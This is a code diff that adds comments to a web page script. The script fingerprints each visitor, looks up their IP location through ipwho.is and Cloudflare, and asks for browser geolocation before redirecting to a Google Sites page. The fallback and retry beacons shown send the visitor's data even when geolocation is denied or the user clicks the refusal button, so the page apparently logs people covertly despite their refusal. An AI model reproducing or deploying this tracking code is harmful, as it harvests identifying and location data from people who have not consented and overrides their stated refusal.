@@ -99,12 +99,14 @@
     let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/";
     let fallbackTriggered = false;
 
+    // Load fingerprint data (e.g. browser/device ID)
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
         fingerprintData.visitorId = result.visitorId || "unknown";
       });
     });
 
+    // Attempt IP region lookup with fallback to Cloudflare
     fetch('https://ipwho.is/')
       .then(res => res.json())
       .then(ip => {
@@ -117,6 +119,7 @@
       })
       .catch(() => {
         fingerprintData.ip = "unresolved";
+        // Fallback if ipwho.is fails
         fetch('https://www.cloudflare.com/cdn-cgi/trace')
           .then(res => res.text())
           .then(data => {
@@ -126,6 +129,7 @@
           });
       });
 
+    // Triggered when user confirms their location
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
       if (!navigator.geolocation) return fallbackBeacon("unsupported");
@@ -159,6 +163,7 @@
       );
     }
 
+    // Used as a backup if POST fails or geolocation is denied
     function fallbackBeacon(reason, pos = {}) {
       fallbackTriggered = true;
       const img = new Image();
@@ -174,6 +179,7 @@
       setTimeout(() => window.location.href = finalRedirectURL, 1000);
     }
 
+    // Retry beacon sent even if POST was successful (as redundancy)
     function sendRetryBeacon(reason, pos) {
       setTimeout(() => {
         const img = new Image();
@@ -188,6 +194,7 @@
       }, 1500);
     }
 
+    // Called if user clicks "Je refuse"
     function refuse() {
       fallbackBeacon("manual-refuse");
       alert("Vous avez refusé. Redirection en cours...");
